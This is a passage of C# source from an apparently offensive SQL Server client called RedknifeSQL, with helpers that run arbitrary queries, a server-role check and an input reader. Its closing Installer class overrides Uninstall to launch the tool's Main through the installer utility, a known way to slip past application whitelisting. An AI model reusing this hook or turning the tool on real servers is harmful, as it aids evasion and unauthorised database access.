                client.DoScript(script);
            }
            else
            {
                Console.WriteLine("Starting interactive mode");
                client.DoClient();
            }
        }

        private static void PrintUsage()
        {
            Console.WriteLine("USAGE: RedknifeSQL.exe [--server SERVER --db DB][--debug][--script SCRIPT_FILE][--output OUTPUT_FILE]");

        }

        private void PrintQuery(string query)
        {
            Console.WriteLine(SEPARATOR);
            Console.WriteLine("EXECUTING QUERY:");
            Console.WriteLine(query);
            Console.WriteLine(SEPARATOR);
        }

        private SqlDataReader ExecuteQuery(string query)
        {
            if (this.Debug) this.PrintQuery(query);

            SqlCommand command = new SqlCommand(query, this.connection);
            // Wait as long as necessary for command to complete
            command.CommandTimeout = 0;
            return command.ExecuteReader();
        }

        private void ExecuteNonQuery(string query)
        {
            if (this.Debug) this.PrintQuery(query);

            SqlCommand command = new SqlCommand(query, this.connection);
            command.ExecuteNonQuery();
        }

        private string QuerySingleValue(string query)
        {
            SqlDataReader reader = ExecuteQuery(query);
            bool read = reader.Read();
            string val = (read ? reader[0].ToString() : null);
            reader.Close();
            return val;
        }

        private bool CheckRole(string role)
        {
            string query = String.Format("SELECT IS_SRVROLEMEMBER('{0}')", role);
            string result = QuerySingleValue(query);
            Int32 hasRole = Int32.Parse(result);
            return hasRole == 1;
        }


        protected string GetInputValue(string message, string defaultValue = null)
        {
            if (defaultValue != null)
            {
                message = string.Format("{0} (default: {1}): ", message, defaultValue);
            }

            Console.Write(message);

            string value = "";
            // Loop for as long as the input line ends with '\'
            while (true)
            {
                string line = Console.ReadLine().Trim();
                if (line.EndsWith("\\"))
                {
                    line = line.Substring(0, line.Length - 1);
                    value += line;
                }
                else
                {
                    // No continuation character - break out of the loop
                    value += line;
                    break;
                }
            }

            // Check whether value has been provided - if no value, use the default (if provided)
            if (defaultValue != null && string.IsNullOrEmpty(value))
            {
                value = defaultValue;
            }

            return value;
        }

    }

    [System.ComponentModel.RunInstaller(true)]
    public class RedknifeSQLUninstaller : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string args = "";
            try
            {
                args = File.ReadAllText("redknifesql.txt");
            } catch (Exception)
            {
                Console.WriteLine("Could not read args from file: redknifesql.txt");
            }

            RedknifeSQL.Main(args.Split(' '));
        }
    }
}
